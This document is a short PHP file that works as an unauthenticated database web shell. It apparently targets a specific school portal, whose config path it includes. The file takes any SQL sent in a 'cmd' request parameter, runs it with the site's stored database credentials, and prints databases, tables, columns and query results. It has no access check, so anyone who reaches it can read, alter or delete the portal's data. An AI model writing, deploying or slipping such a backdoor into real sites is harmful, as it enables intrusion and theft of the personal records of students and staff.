<?php
if (isset($_REQUEST["cmd"])) {
    // Include the database connection file
    include('/var/www/vhosts/fcpc.edu.ph/schoolportal.fcpc.edu.ph/dev/model/configuration/configuration-config.php');
    
    $cmd = ($_REQUEST["cmd"]);
    
    // Establish the MySQL connection
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
    
    // Check the connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Execute the query and capture the result
    $result = $conn->query($cmd);

    if ($result) {
        echo "<pre>";
        
        // Handle specific cases for different queries
        if (strpos(strtoupper($cmd), "SHOW DATABASES") !== false) {
            // Display databases
            while ($row = $result->fetch_assoc()) {
                echo $row['Database'] . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "SHOW TABLES") !== false) {
            // Display tables
            while ($row = $result->fetch_assoc()) {
                echo $row['Tables_in_' . DB_NAME] . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "SHOW COLUMNS") !== false) {
            // Display columns of a table
            while ($row = $result->fetch_assoc()) {
                echo $row['Field'] . " - " . $row['Type'] . "\n";
            }
        } elseif (strpos(strtoupper($cmd), "SELECT") === 0) {
            // Handle SELECT queries
            
            // Start the table
            echo "<table border='1' cellpadding='5' cellspacing='0'>";
            
            // Fetch the column names (header row)
            $fields = $result->fetch_fields();
            echo "<tr>";
            foreach ($fields as $field) {
                echo "<th>" . htmlspecialchars($field->name) . "</th>";
            }
            echo "</tr>";
            
            // Fetch and display the rows of the result
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "</tr>";
            }

            // End the table
            echo "</table>";
        } else {
            // Handle other types of queries
            echo "Query executed successfully.\n";
        }

        echo "</pre>";
    } else {
        echo "Error: " . $conn->error;
    }

    // Close the connection
    $conn->close();
}
?>
